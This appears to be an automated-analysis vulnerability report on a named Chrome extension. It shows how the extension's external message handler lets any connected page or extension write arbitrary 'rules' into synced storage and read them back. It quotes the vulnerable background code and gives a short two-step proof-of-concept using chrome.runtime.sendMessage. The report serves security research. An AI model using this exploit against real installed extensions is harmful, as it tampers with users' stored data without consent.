# CoCo Analysis: cjkbjhfhpbmnphgbppkbcidpmmbhaifa

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cjkbjhfhpbmnphgbppkbcidpmmbhaifa/opgen_generated_files/bg.js
Line 975	    var rules = request.rules;

**Code:**

```javascript
// Background script - External message handler (bg.js Line 1040)
chrome.runtime.onMessageExternal.addListener(routeExternalMessages); // ← entry point

// Message router (bg.js Line 1030-1037)
function routeExternalMessages(request, sender, sendResponse) {
    console.info("eventPage.routeExternalMessages <<", {request:request, sender:sender});
    var type = request._type; // ← attacker-controlled
    delete request._type;
    switch(type){
        case 'echo':         return onEcho(request, sendResponse);
        case 'get_rules':    return onGetResults(sendResponse); // ← retrieval path
        case 'save_rules':   return onSaveRules(request, sendResponse); // ← sink path
    }
    sendResponse({ error: "Unknown message type ["+request.type+"]." });
}

// Storage write sink (bg.js Line 974-990)
function onSaveRules(request, sendResponse){
    var rules = request.rules; // ← attacker-controlled data
    console.info("eventPage.onSaveRules", request);

    if (rules) {
        chrome.storage.sync.set({
            rules: rules // ← storage poisoning sink
        }, function () {
            console.info("saved", rules);
            sendResponse({ success: true });
        });
        return true;
    }

    sendResponse({success: false, error: "No rules to save"});
    return false;
}

// Storage read and exfiltration (bg.js Line 997-1004)
function onGetResults(sendResponse){
    console.info("eventPage.onGetResults");
    chrome.storage.sync.get(null, function(store) {
        console.info("eventPage.onGetResults << ", store);
        sendResponse({ rules: store.rules || [] }); // ← exfiltration via sendResponse
    });
    return true;
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any webpage matching externally_connectable (player.me)
// Or from any other extension (external messages work cross-extension)

// Step 1: Poison storage with malicious rules
chrome.runtime.sendMessage(
  'cjkbjhfhpbmnphgbppkbcidpmmbhaifa',
  {
    _type: 'save_rules',
    rules: [
      { pattern: 'sensitive', action: 'malicious_payload' }
    ]
  },
  (response) => {
    console.log('Storage poisoned:', response);
  }
);

// Step 2: Retrieve poisoned data
chrome.runtime.sendMessage(
  'cjkbjhfhpbmnphgbppkbcidpmmbhaifa',
  {
    _type: 'get_rules'
  },
  (response) => {
    console.log('Exfiltrated rules:', response.rules);
    // Attacker receives the poisoned rules data back
  }
);
```

**Impact:** Complete storage exploitation chain - attacker can poison chrome.storage.sync with arbitrary rules data and retrieve it back via sendResponse. This allows for persistent storage manipulation and information disclosure. The attacker controls both the write and read operations, enabling data exfiltration of whatever they store.
